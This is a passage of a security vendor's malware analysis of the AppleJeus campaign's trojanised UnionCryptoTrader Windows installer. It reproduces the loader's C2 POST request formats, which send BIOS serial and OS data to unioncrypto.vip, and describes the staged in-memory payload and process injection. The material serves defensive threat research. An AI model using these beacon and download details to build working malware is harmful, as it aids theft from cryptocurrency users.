@@ -1,0 +1,82 @@
+Windows version of UnionCryptoTrader
+We also found a Windows version of the UnionCryptoTrader (0f03ec3487578cef2398b5b732631fec). It was executed from the
+Telegram messenger download folder:
+C:\Users[user name]\Downloads_ Telegram Desktop \UnionCryptoTraderSetup.exe_
+We also found the actor’s Telegram group on their fake website. Based on these, we assess with high confidence that the actor
+delivered the manipulated installer using the Telegram messenger. Unfortunately, we can’t get all the related files as some payloads
+were only executed in memory. However, we can reassemble the whole infection procedure based on our telemetry. The overall
+infection procedure was very similar to the WFCWallet case, but with an added injection procedure, and they only used the final
+backdoor payload instead of using a tunneling tool.
+https://securelist.com/operation-applejeus-sequel/95596/ 3/10
+1/14/2020 Operation AppleJeus Sequel | Securelist
+Fig. 2 Binary infection procedure
+The UnionCryptoTrader Windows version has the following window showing a price chart for several cryptocurrency exchanges.
+Fig. 3 Windows version of UnionCryptoTrader
+The Windows version of UnionCryptoTrader updater (629b9de3e4b84b4a0aa605a3e9471b31) has similar functionality to the macOS
+version. According to the build path (Z:\ Loader \x64\Release\ WinloaderExe .pdb), the malware author called this malware a loader.
+Upon launch, the malware retrieves the victim’s basic system information, sending it in the following HTTP POST format, as is the
+case with the macOS malware.
+https://securelist.com/operation-applejeus-sequel/95596/ 4/10
+1/14/2020 Operation AppleJeus Sequel | Securelist
+1
+2
+3
+4
+5
+6
+7
+8
+9
+POST /update HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Chrome/75.0.3770.142 Safari/537.36
+auth_timestamp: [Current time]
+auth_signature: [Generated MD5 value based on current time]
+Content-Length: 110
+Host: unioncrypto.vip
+rlz=[BIOS serial number]&ei=[OS version] ([build number])&act=check
+If the response code from the C2 server is 200, the malware decrypts the payload and loads it in memory. Finally, the malware sends
+the act=done value and return code. The next stage payload (e1953fa319cc11c2f003ad0542bca822), downloaded from this loader, is
+similar to the .NET downloader in the WFCWallet case. This malware is responsible for decrypting the Adobe.icx file in the same
+folder. It injects the next payload into the Internet Explorer process, and the tainted iexplore.exe process carries out the attacker’s
+commands. The final payload (dd03c6eb62c9bf9adaf831f1d7adcbab) is implanted manually as in the WFCWallet case. This final
+payload was designed to run only on certain systems. It seems that the malware authors produced and delivered malware that only
+works on specific systems based on previously collected information. The malware checks the infected system’s information and
+compares it to a given value. It seems the actor wants to execute the final payload very carefully, and wants to evade detection by
+behavior-based detection solutions.
+Fig. 4 Malware execution flow
+This Windows malware loads the encrypted msctfp.dat file in a system folder, and loads each configuration value. Then it executes an
+additional command based on the contents of this file. When the malware communicates with the C2 server, it uses a POST request
+with several predefined headers.
+1
+2
+3
+4
+5
+6
+7
+POST /[C2 script URL] HTTP/1.1
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive or Connection: close
+User-Agent: [User-agent of current system]
+Host: unioncrypto.vip
+For the initial communication, the malware first sends parameters:
+cgu: 64bits hex value from configuration
+aip: MD5 hash value from configuration
+sv: hardcoded value(1)
+https://securelist.com/operation-applejeus-sequel/95596/ 5/10
+1/14/2020 Operation AppleJeus Sequel | Securelist
+If the response code from the C2 server is 200, the malware sends the next POST request with encrypted data and a random value.
+The malware operator probably used the random value to identify each victim and verify the POST request.
+imp: Random generated value
+dsh: XORed value of imp
+hb_tp: XORed value(key: 0x67BF32) of imp
+hb_dl: Encrypted data to send to C2 server
+ct: hardcoded value(1)
+Finally, the malware downloads the next stage payload, decrypting it and possibly executing it with the Print parameter. We speculate
+that the DLL type payload will be downloaded and call its Print export function for further infection. We can’t get hold of the final
+payload that’s executed in memory, but we believe its backdoor-type malware is ultimately used to control the infected victim.
